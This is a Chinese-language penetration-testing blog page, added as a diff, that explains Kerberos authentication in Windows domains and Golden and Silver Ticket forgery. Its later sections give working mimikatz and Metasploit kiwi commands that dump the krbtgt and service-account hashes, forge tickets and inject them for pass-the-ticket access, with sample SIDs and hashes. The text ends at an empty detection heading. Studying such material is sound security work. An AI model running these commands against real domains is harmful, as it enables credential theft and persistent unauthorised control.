@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            域渗透之Kerberos |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">域渗透之Kerberos</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2019-12-03 14:35:00</span>
+        <span class="mobile">2019-12-03 14:35</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="什么是域？"><a href="#什么是域？" class="headerlink" title="什么是域？"></a>什么是域？</h1><p>​    域是一个有安全边界的计算机集合。对于不同的域来说，相当于不同的组织、集体。每个域都有自己的安全策略，以及它与其他域的安全信任关系。对于同一个域内部的不同计算机来说，它们通过<strong>共同的第三方信任机构</strong>建立信任关系，这个第三方信任机构角色由 <em><strong>DC (Domain Controller，域控制器)</strong></em> 担当，<u>所有的认证及信任关系的建立由DC来完成</u>，域内计算机直接不再进行独立的点对点安全认证。通俗来说就是，域中的机器信任域控制器，那么只要我们获得了域控制器信任，就可以在域内获得对其他服务器的访问权限。每个域的管理员只能管理自己所属域的内部，除非其他的域赋予了管理权限，这样才能够访问或者管理其他域。域管理员可以通过持有域的登陆和访问<code>票据</code>，从而有权限登陆域内任何一台机器，实现对域内其他计算机的远程管理、资源访问，因此域管理员权限是十分大的，而<u>在域环境中实现这种认证机制的就是<code>Kerberos</code></u> 。</p>
+<h1 id="一个模拟的认证场景"><a href="#一个模拟的认证场景" class="headerlink" title="一个模拟的认证场景"></a>一个模拟的认证场景</h1><p>​    为了帮助我们理解kerberos认证，我们先模拟一个认证场景，假设有一家实行会员制的高级餐厅，只有持餐厅<code>会员证</code>的顾客能够在餐厅购买指定包厢的<code>用餐券</code>，进而凭用餐券在对应包厢进行用餐，普通顾客无权消费和用餐。假设有一位会员顾客想要用餐，他需要经过以下流程：</p>
+<ul>
+<li>首先，顾客到前台会员认证处提供自己的姓名、手机、身份证等信息，要求领取会员证。</li>
+<li>前台客服在电脑上的会员信息库中搜索相关信息，判断是否存在该会员用户。如果有，则给用户提供会员证。</li>
+<li>顾客拿到会员证后去前台购券处，凭借会员证，拿到一张用户指定包厢的用餐券。</li>
+<li>顾客拿到用餐券后，来到这个指定的包厢，凭借用餐券用餐。如果顾客拿着该用餐券去其他包厢，则无法用餐。</li>
+</ul>
+<p>​    在这个场景中，我们很明显能够看出来，如果我们想要用餐，必须要有两样东西：会员证、用餐券。会员证可以证明我们有权购买用餐券；而凭借用餐券，我们才能用餐。所以想要用餐，必须先拿到会员证，再凭借会员证拿到用餐券，进而凭券用餐。理解了这个场景中的认证机制，我们便进入正题。</p>
+<h1 id="认识Kerberos认证体系"><a href="#认识Kerberos认证体系" class="headerlink" title="认识Kerberos认证体系"></a>认识Kerberos认证体系</h1><h2 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h2><p>​    <code>Kerberos</code> 是除<code>NTML</code>的另外一种网络认证协议，支持Windows和Linux。它提供了一种单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p>
+<p>​    因为考虑到这样的场景，在一个网络中会有许多不同的网络对象，比如web服务器、打印机、邮件服务器、文件服务器等等，这些不同的网络对象都有认证需求，很明显，由于架构不同，我们不可能让每个对象都自己实现一套认证系统，因此Kerberos基于一个<code>中心认证服务器</code>，由该服务器统一进行<strong>身份认证</strong>。中心认证服务器维护了一个<code>帐号数据库(AD，Account Database)</code>，类似于存储本地用户名、密码hash的数据库<code>SAM</code>，AD数据库中存储了合法域用户的用户名及密码Hash信息，所有客户端只需与该认证服务器认证，即可判断身份合法性。</p>
+<p>​    在通过身份认证机制后，Kerberos提供一种基于<code>票据（Ticket）</code>的可信任的第三方<strong>访问认证</strong>服务，通过传统的密码技术（如共享密钥）执行访问认证。假如客户端要访问服务器的资源，需要获取服务器认可的Ticket。打个比喻就是<code>凭票入场</code>，类似于<u>上文提到的用餐场景</u>，但是获取票据之前，还需要先拿到一张购票证，有这个购票证的才能买票，这张“购票证”叫做<code>票据授予凭证 (TGT，Ticket Granting Ticket)</code>。</p>
+<p>​    颁发TGT（Ticket Granting Ticket）的工作由AS服务（Authentication Sevice）完成，而颁发Ticket的工作由TGS服务（Ticket Granting Service）完成，类似上文提到的用餐场景中的<strong>前台会员认证处</strong>与<strong>前台购券处</strong>。AS 和 TGS 服务共同构成了具有完整<u><strong>身份认证</strong></u>及<u><strong>访问认证</strong></u>功能的服务中心，该服务中心有一个专门的名字，叫做“<strong>密钥分发中心</strong>”<code>(KDC，Key Distribution Center)</code>。在Windows域环境中，<code>AD帐号数据库</code>和<code>KDC</code>的角色在物理上均由域控制器<code>DC（Domain Controller）</code>来担任，因此这也是为什么我在开篇说<u>域中的认证及信任关系的建立均由DC来完成</u>，由此可见域控制器的重要性。</p>
+<h2 id="Kerberos认证体系中的重要角色"><a href="#Kerberos认证体系中的重要角色" class="headerlink" title="Kerberos认证体系中的重要角色"></a>Kerberos认证体系中的重要角色</h2><p><strong>Kerberos</strong></p>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC (Key Distribution Center)</li>
+</ul>
+<p> <strong>DC (Domain Controller)</strong></p>
+<ul>
+<li><p>AD (Account Database)：帐号数据库</p>
+</li>
+<li><p>KDC (Key Distribution Center)：密钥分发中心</p>
+<ul>
+<li>AS (Authentication Service)：为客户端生成<code>TGT</code></li>
+<li>TGS (Ticket Granting Service)：为客户端生成某个服务器的<code>Ticket</code></li>
+</ul>
+</li>
+</ul>
+<p>用一张图来表示它们的逻辑关系：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-kerberos/1544275498280.png" alt="1544275498280"></p>
+<blockquote>
+<p>注意：在有些文章里提到的<code>KAS</code>(Kerberos Authentication Service) 的概念实际上就是<code>AS </code>(Authentication Service)。</p>
+</blockquote>
+<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>在正式了解kerberos认证机制之前，你必须熟读以下概念，并且如果你在后文忘记了这些概念，可以快速回顾。</p>
+<ul>
+<li><p><code>AD (Account Database)</code>：帐号数据库，与<code>SAM </code>(Security Account Manager Database，安全账号管理数据库)类似，位于<code>ntds.dit</code>文件中，存储了用户的用户名及密码Hash，只有存在于该数据库中的用户才被认为是合法和可信任的，才能申请到TGT。</p>
+</li>
+<li><p><code>Ticket</code>：票据，全称为ST(Service Ticket)，服务票据，是网络对象授权访问的凭证，持有某个服务器服务票据的客户端才有权访问该服务器上的资源。</p>
+</li>
+<li><p><code>TGT (Ticket Granting Ticket)</code>：直译为<code>票据授予票据</code>，我将其译为<strong>票据授予凭证</strong>，这是是一种临时凭证，只有拥有此凭证，才能够获取到票据。网上很多人意译为<code>入场券</code>，也是差不多的意思，喻义<code>凭入场券购票，凭票入场</code>。</p>
+</li>
+<li><p><code>KDC (Key Distribution Center)</code>：密钥分发中心，负责管理、认证、分发票据。KDC由<code>AS</code>、<code>TGS</code>服务共同组成。AS服务可以生成TGT，而TGS服务则可以生成Ticket 。</p>
+</li>
+<li><p><code>AS (Authentication Service)</code>：在身份认证阶段中，为客户端生成TGT，凭借TGT后续才能申请Ticket 。</p>
+</li>
+<li><p><code>TGS (Ticket Granting Service)</code>：在访问认证阶段中，为客户端生成可访问服务器资源的Ticket。</p>
+</li>
+<li><p><code>Active Directory Domain Services</code>：    <a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/AD/active-directory-domain-services" >Active Directory域服务<i class="fas fa-external-link-alt"></i></a>是Windows提供的一种对网络资产、服务、网络对象（如用户，计算机，打印机等）进行组织化管理的服务。它可以集中控制加入域的所有计算机的权限，具有统一化管理、更高效的权限分配、更高的安全性、较低的管理成本等特性，因此一般许多企业和组织会通过Active Directory域服务来进行统一化管理。Active Directory域服务<u>以域名来划分域的边界</u>，定义网络管理范围。通常一个域对应一个域名，域之间可以相互信任。<u>在Windows Server上，如果想要构建域环境，必须安装这个服务</u>。安装过程中，你需要设置一个域名来表示你的内部域环境。安装完毕后，运行<code>dcpromo</code>命令则会检查Active Directory域服务的安装情况。安装了Active Directory域服务的服务器，会被视为DC（Domain Controller）域控制器。如果想要加入一个域，你只需在客户端计算机名中设置该域的域名即可。如果你想构建一个基础的域环境，可以参考<a href="">域渗透之构建基础域环境</a>。</p>
+</li>
+</ul>
+<h2 id="Kerberos域认证流程"><a href="#Kerberos域认证流程" class="headerlink" title="Kerberos域认证流程"></a>Kerberos域认证流程</h2><p>kerberos认证从整体流程上分为三个阶段：</p>
+<ol>
+<li>请求TGT票据</li>
+<li>请求Ticket票据</li>
+<li>通过Ticket访问服务器</li>
+</ol>
+<p>下面介绍一下详细流程：</p>
+<p><strong>第一阶段：向AS请求TGT票据(AS_REQ &amp; AS_REP)</strong></p>
+<ol>
+<li>用户访问客户端计算机并输入域帐号和密码，尝试访问服务器资源</li>
+<li>客户端对密码进行hash处理并缓存，然后将用户名、加密的<code>Authenticator认证信息</code>发送给KDC进行<code>AS_REQ</code> 认证请求，请求获得TGT。这里发送的两个数据为：<ul>
+<li>用于登录的用户名</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/authenticator-messages" >Authenticator<i class="fas fa-external-link-alt"></i></a>认证信息：包含客户端信息(Domain\hostname)以及时间戳，使用用户的NTML-Hash加密</li>
+</ul>
+</li>
+<li>KDC收到请求后，在<em><strong>AD (Account Database，帐户数据库)</strong></em> 查找该用户名，如果存在该用户，提取该用户密码的Hash作为密钥解密Authenticator信息，如果解密成功，则证明请求者提供的密码正确，即成功认证了对方身份。这时，KDC便生成一个随机字符串作为临时密钥，叫<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/ticket-granting-tickets" >Login Session Key (登录会话密钥)<i class="fas fa-external-link-alt"></i></a>，然后用该用户的NTML-Hash加密这个Login Session Key作为<code>消息1</code>；同时，KDC使用<code>自己的密钥(krbtgt)</code>加密Login Session Key和客户端信息，生成TGT，作为<code>消息2</code>。最后，KDC将消息1和消息2返回给客户端，即 <code>AS_REP</code>。这里一共返回了两个数据：<ul>
+<li>Login Session Key：用于下一阶段客户端与TGS (Ticket Granting Service) 通信时使用的密钥，也叫做<code>TGS会话密钥</code>。<strong>整体使用AD中对应帐号的密码Hash加密。</strong></li>
+<li>TGT：包含Login Session Key、客户端信息、时间戳、TGT有效期。<strong>整体使用krbtgt账户密码的Hash进行加密</strong></li>
+</ul>
+</li>
+<li>客户端接收到返回的两个消息之后，使用自己的密码hash对消息1进行解密，如果用户提供的凭证是正确的，则解密成功，此时用户得到了<code>Login Session Key</code>以及加密后的<code>TGT</code>。</li>
+</ol>
+<blockquote>
+<p>Note：KDC自己的密钥，宏观上来说就是默认域账户krbtgt密码的NTML Hash，这个密钥只存在于域控制器上，因此KDC返回给客户端的TGT正常情况情况下只有自己才能解密 ，并且TGT是具有时间戳属性及有效期的，超过了有效期则需要重新申请。</p>
+<p>第一阶段结束后，客户端获取到了<code>Login Session Key</code>以及加密的<code>TGT</code>，开始进入下个阶段，请求获取Ticket服务票据。</p>
+<p>AS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化。</p>
+</blockquote>
+<p><strong>第二阶段：向TGS请求Ticket服务票据(TGS_REQ &amp; TGS_REP)</strong></p>
+<ol>
+<li>客户端把用户名、使用Login Session Key加密的Authenticator、加密的TGT、要访问的服务器信息发送给KDC，请求获取Ticket。这里一共发送了四个数据：<ul>
+<li>用于进行登录的用户名</li>
+<li>使用Login Session Key加密的Authenticator信息</li>
+<li>第一阶段获取到的加密的TGT</li>
+<li>要访问的服务器名信息</li>
+</ul>
+</li>
+<li>KDC收到请求之后，在<em><strong>AD (Account Database，帐户数据库)</strong></em> 查找该用户名，如果存在该用户，KDC会使用<code>自己的密钥</code>解密TGT，在解密的TGT中获取到TGS会话密钥（即Login Session Keyy），进而使用Login Session Key对Authenticator进行解密，如果解密成功，则验证了对方的真实身份。此时KDC会生成一个<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/ticket-granting-service-exchange" >Service Session Key(服务会话密钥)<i class="fas fa-external-link-alt"></i></a>，以及Server Ticket。最后KDC用Logon Session 加密Service Session Key作为消息1；使用用户密码的Hash加密Ticket票据，作为消息2。然后把消息1和消息2返回给客户端 。<ul>
+<li>Service Session Key：用于下一阶段客户端与服务器通信，也叫做<code>SS会话密钥</code>，整体使用Logon Session Key加密</li>
+<li>Server Ticket：服务票据，包含Service Session Key和客户端信息。用于下一阶段客户端访问服务器的凭证。整体使用服务器密码的Hash进行加密</li>
+</ul>
+</li>
+<li>客户端收到消息后，利用自己缓存的Logon Session Key解密Service Session Key，同时它也得到了用服务器密码Hash加密的Ticket。</li>
+</ol>
+<blockquote>
+<p>Note：第二阶段结束后，客户端拿到了Service Session Key以及加密的Ticket，这个Ticket使用服务器密码的Hash进行加密。只有域控制器和服务器能够进行解密。下面进入第三阶段，客户端凭借Ticket访问服务器上的资源。</p>
+</blockquote>
+<p><strong>第三阶段：通过Ticket访问服务器(AP-REQ &amp; AP-REP)</strong></p>
+<ol>
+<li>客户端向服务器发送以下两条消息：<ul>
+<li>加密的ticket</li>
+<li>用Service Session Key加密的Authenticator信息</li>
+</ul>
+</li>
+<li>服务器收到消息之后，会用自己的密码Hash对Ticket进行解密，获取到Ticket中的Service Session Key，然后使用Service Session Key对Authenticator进行解密，如果解密成功，则认证了用户身份，此时便将这个加密的Ticket缓存到自己的内存中，并且把解密后的Authenticator用Service Session Key重新加密，数据不变，然后把加密的Authenticator发送给客户端。</li>
+<li>客户端收到消息后，用缓存的Service Session Key对Authenticator进行解密，如果其中的数据和之前一样，则验证了服务器端的身份。</li>
+</ol>
+<p>至此，客户端与服务器就完成了一次完整的握手过程，建立了TCP连接，在之后的访问过程中，客户端只要在请求数据包中携带加密的Ticket信息，即可无需再进行认证。</p>
+<h1 id="Kerberos认证过程中的弱点"><a href="#Kerberos认证过程中的弱点" class="headerlink" title="Kerberos认证过程中的弱点"></a>Kerberos认证过程中的弱点</h1><p>​    如果你认真阅读并理解了Kerberos认证流程，就可以知道，Kerberos认证的安全性并非是无懈可击的，如果认证过程中的Ticket被伪造，依旧会带来安全问题，这就是常见的票据传递攻击（Pass-The-Ticket），只是这些伪造需要满足一些前提条件。</p>
+<h2 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h2><p>​    整体回顾三个阶段的认证流程，我们可以发现，在第一阶段中，KDC自己的密钥，即默认域管理员帐号krbtgt的密码Hash参与生成TGT，那么如果我们拥有krbtgt帐号密码的Hash，就可以任意伪造TGT票据，那么之后的认证过程也能由我们任意控制，进而可以任意颁发票据访问个域成员主机的服务。不过实现这些的前提是我们能够拿下域控制器，获得krbtgt密码的Hash。在这个阶段被伪造的<code>TGT</code>票据，被叫做<code>黄金票据（Golden Tickets）</code>。</p>
+<h2 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h2><p>​    在第二阶段的认证过程中，最后客户端拿到了Service Session Key以及加密的Ticket，这个Ticket使用服务器密码的Hash进行加密，那么如果我们拥有服务器密码的Hash，我们就可以伪造一个加密的Server Ticket，利用这个伪造的Ticket，参与第三阶段的认证过程。在这个阶段被伪造的<code>Server Ticket</code>被称为<code>白银票据（Silver Ticket）</code>。</p>
+<p>Golden Ticket与Silver Ticket的不同之处：</p>
+<ul>
+<li><p>访问权限不同 ： Golden Ticket是伪造的TGT，可访问任何域成员服务；Silver Ticket是伪造的TGS，只能访问特定主机的服务。</p>
+</li>
+<li><p>加密方式不同 ： Golden Ticket是用域 Kerberos 服务帐户 ( <a class="link"   target="_blank" rel="noopener" href="https://adsecurity.org/?p=483" >krbtgt)<i class="fas fa-external-link-alt"></i></a>加密的；而Silver Ticket是由服务帐户（从计算机的本地SAM或服务帐户凭据中提取的计算机帐户凭据）加密的。</p>
+</li>
+<li><p>认证流程不同： Golden Ticket的获取使用需要与域控通信；Silver Ticket的使用不需要与域控通信。</p>
+</li>
+</ul>
+<p>对比来看，伪造黄金票据，能够攻击除了域控制器之外的其他所有域服务器，实现持久化隐藏和控制这个域，危害巨大，但是前提需要先拿到域控制器的权限。 而伪造白银票据，仅能够攻击特定的服务器，但是伪造白银票据的难度比伪造黄金票据的难度较小，因为通常来说服务器部署了更多的应用，安全性较域控制器来说相对更低。</p>
+<h1 id="Pass-The-Ticket-Attack"><a href="#Pass-The-Ticket-Attack" class="headerlink" title="Pass-The-Ticket Attack"></a>Pass-The-Ticket Attack</h1><h2 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" >mimikatz<i class="fas fa-external-link-alt"></i></a></h3><p>1.首先我们需要先拿到krbtgt帐号的NTML Hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::dcsync /user:krbtgt&quot;</span> <span class="built_in">exit</span> &gt; krbtgt.txt</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::lsa /inject /name:krbtgt&quot;</span> <span class="built_in">exit</span> &gt; krbtgt.txt</span><br></pre></td></tr></table></figure>
+
+<p>接下来准备伪造黄金票据，mimikatz伪造黄金票据需要一些必要的参数：</p>
+<ul>
+<li><code>/domain</code> - 域名</li>
+<li><code>/sid</code>-  域SID</li>
+<li><code>/user</code> - 要模拟的用户名，可以任意</li>
+<li><code>/rc4</code> or <code>/krbtgt</code> - krbtgt 账户的 NTLM hash</li>
+<li><code>/ptt</code> - 在当前会话中注入票据</li>
+<li><code>/ticket</code>- <em>可选</em> - 导出票证 ，默认文件名为：<code>ticket.kirbi</code></li>
+<li><code>/id</code> - <em>可选</em>  - 用户的ID ，默认为：<code>500</code>(默认管理员ID)</li>
+<li><code>/groups</code>- <em>可选</em>  - 用户所属组的ID ，默认为513,512,520,518,519(常见默认管理员组)</li>
+</ul>
+<blockquote>
+<p>Note：SID全称Security Identifiers(安全标识符)，用于标识用户或组。要获取域SID，我们可以查询用户的SID，去掉最后几位RID即可，可以使用<code>whoami /user</code>、<code>wmic useraccount get name,sid</code>查看。实际上刚才我们可以直接从mimikatz获取的<code>krbtgt</code>的SID中查看。</p>
+<p>Windows系统帐户对应固定的RID：<br>500：Administrator<br>501：Guest<br>502：krbtgt (域环境)<br>512：Domain Admins (域环境)<br>513：Domain Users (域环境)<br>514：Domain Guests (域环境)<br>515：Domain Computers (域环境)<br>516：Domain Controllers (域环境)</p>
+</blockquote>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-kerberos/20181210192343.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list		<span class="comment">#列出票据</span></span><br><span class="line">kerberos::purge		<span class="comment">#清除所有票据</span></span><br><span class="line"><span class="comment"># 伪造票据</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /user:wowowo /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /krbtgt:&lt;krbtgt&#x27;s ntml hash&gt; /ptt&quot;</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::golden /user:hacker /domain:ssooking.com /sid:S-1-5-21-4168241775-2339322854-2282195709 /krbtgt:f83726428e45eceead37a334aef1dc3a /ptt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，我们访问服务器的共享目录会弹出认证框进行身份认证，当我们伪造票据之后，再次访问域服务器DM1的共享目录时，发现无需认证即可访问。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-kerberos/20181212194816.png"></p>
+<p>或者使用<code>net use</code>直接映射服务器的磁盘，此时也无需提供口令凭证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\Win2008-dm1\D$</span><br></pre></td></tr></table></figure>
+
+<p>其他方法</p>
+<p>通过mimikatz导出域控制器内存中的Ticket： </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p>挑选其中的某个kirbi文件，在域普通用户的主机进行导入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt C:\test\xxxx.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>使用meterpreter中的<code>kiwi</code>模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; load kiwi</span><br><span class="line">meterpreter&gt; kerberos_ticket_list	<span class="comment">#列出票据</span></span><br><span class="line">meterpreter&gt; kerberos_ticket_purge	<span class="comment">#清除所有票据</span></span><br><span class="line"><span class="comment"># 伪造票据</span></span><br><span class="line">meterpreter&gt; golden_ticket_create -u &lt;username&gt;  -d &lt;domain&gt; -k &lt;krbtgt ntml <span class="built_in">hash</span>&gt; -s &lt;domain SID&gt; -t /tmp/krbtgt.ticket</span><br><span class="line">meterpreter&gt; kerberos_ticket_use /tmp/krbtgt.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-kerberos/20181212194507.png"></p>
+<h2 id="伪造白银票据"><a href="#伪造白银票据" class="headerlink" title="伪造白银票据"></a>伪造白银票据</h2><p>伪造白银票据需要先获取目标服务账户的hash，以mimikatz为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug” &quot;</span>sekurlsa::logonpasswords<span class="string">&quot; &quot;</span><span class="built_in">exit</span><span class="string">&quot; &gt; log.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>mimikatz可以用来伪造银票，同样是使用<code>kerberos::golden</code>，但是指定的是服务帐户的密码哈希值，不是krbtgt的hash。mimikatz伪造白银票据需要一些必要的参数：</p>
+<ul>
+<li><code>/domain</code> - 域名</li>
+<li><code>/sid</code>-  域SID</li>
+<li><code>/user</code> - 要模拟的用户名，可以任意</li>
+<li><code>/target</code> – 目标服务器域名</li>
+<li><code>/service</code> – 目标服务主体名称（<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names" >参考<i class="fas fa-external-link-alt"></i></a>）</li>
+<li><code>/rc4</code>   服务账户NTLM hash</li>
+<li><code>/ptt</code> - 在当前会话中注入票据</li>
+</ul>
+<p>使用mimikatz伪造白银票据，并将其注入到cmd.exe会话中：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; .\mimikatz.exe <span class="string">&quot;kerberos::golden /user:random_user /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt&quot;</span> <span class="string">&quot;misc::cmd&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h1><ul>
